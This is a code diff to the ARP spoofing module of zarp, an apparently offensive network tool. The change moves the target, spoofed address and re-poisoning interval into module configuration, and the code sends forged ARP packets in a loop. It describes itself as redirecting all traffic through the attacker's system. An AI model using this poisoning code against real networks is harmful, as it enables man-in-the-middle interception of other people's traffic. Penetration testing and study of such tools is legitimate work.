@@ -12,33 +12,40 @@ class arp(Poison):
     """
 
     def __init__(self):
-        # keep scapy quiet
+        super(arp, self).__init__('ARP Spoof')
         conf.verb = 0
         # tuples (ip,mac)
         self.local  = (config.get('ip_addr'), get_if_hwaddr(config.get('iface')))
         self.victim = ()
         self.target = ()
-        super(arp, self).__init__('ARP Spoof')
+        self.config.update({"to_ip":{"type":"ip", 
+                                     "value":None,
+                                     "required":True, 
+                                     "display":"Target to poison"},
+                            "from_ip":{"type":"ip", 
+                                       "value":None,
+                                       "required":True, 
+                                       "display":"Address to spoof from target"},
+                            "respoof":{"type":"int", 
+                                       "value":2,
+                                       "required":False, 
+                                       "display":"Interval to send respoofed ARP packets"}
+                          })
+        self.info = """
+                    The heart and soul of zarp.  This module exploits the ARP
+                    protocol to redirect all traffic through the attacker's 
+                    chosen system. 
+
+                    http://en.wikipedia.org/wiki/ARP_poison
+                    """
 
     def initialize(self):
         """Initialize the ARP spoofer
         """
-        try:
-            Msg('Using interface [%s:%s]' % (config.get('iface'), self.local[1]))
-            # get ip addresses from user
-            to_ip = raw_input("[!] Enter host to poison:\t")
-            from_ip = raw_input("[!] Enter address to spoof:\t")
-            tmp = raw_input("[!] Spoof IP {0} from victim {1}.  Is this correct? [Y/n]".format(to_ip, from_ip))
-
-            self.victim = (to_ip, getmacbyip(to_ip))
-            self.target = (from_ip, getmacbyip(from_ip))
-        except KeyboardInterrupt:
-            return None
-        except Exception, j:
-            debug('Error loading ARP poisoning module: %s' % (j))
-            return None
-        if "n" in tmp.lower():
-            return
+        self.victim = (self.config['to_ip']['value'], 
+                            getmacbyip(self.config['to_ip']['value']))
+        self.target = (self.config['from_ip']['value'],
+                            getmacbyip(self.config['from_ip']['value']))
         Msg("Initializing ARP poison...")
         return self.initialize_post_spoof()
 
@@ -80,7 +87,7 @@ class arp(Poison):
             pkt /= ARP(op="who-has", psrc=victim[0], pdst=target[0])
             while self.running:
                 sendp(pkt, iface_hint=target[0])
-                time.sleep(2)
+                time.sleep(self.config['respoof']['value'])
         except Exception, j:
             Error('Spoofer error: %s' % j)
             return None
